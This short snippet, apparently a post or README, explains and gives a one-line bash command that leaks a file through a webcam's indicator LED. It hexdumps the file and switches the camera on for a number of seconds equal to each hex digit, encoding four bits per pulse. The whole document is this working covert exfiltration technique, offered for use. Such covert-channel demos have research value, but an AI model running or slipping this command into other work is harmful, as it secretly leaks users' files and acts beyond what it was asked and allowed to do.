

This line of shell script leaks a `file` from the webcam led by flashing it by periods of time (seconds) representing a hexadecimal value, meaning this leaks 4bits per pulse from `0` -> `0000` to `F` -> `1111` so each pulse duration is a single hex digit from the hexdump of the file you want to leak.

```bash
xxd -c 1 -p file | while read a;do for b in ${a:0:1} ${a:1:1};do ffmpeg -y -f v4l2 -i /dev/video0 -t $((0x$b)) -f rawvideo /dev/null;done;done
```
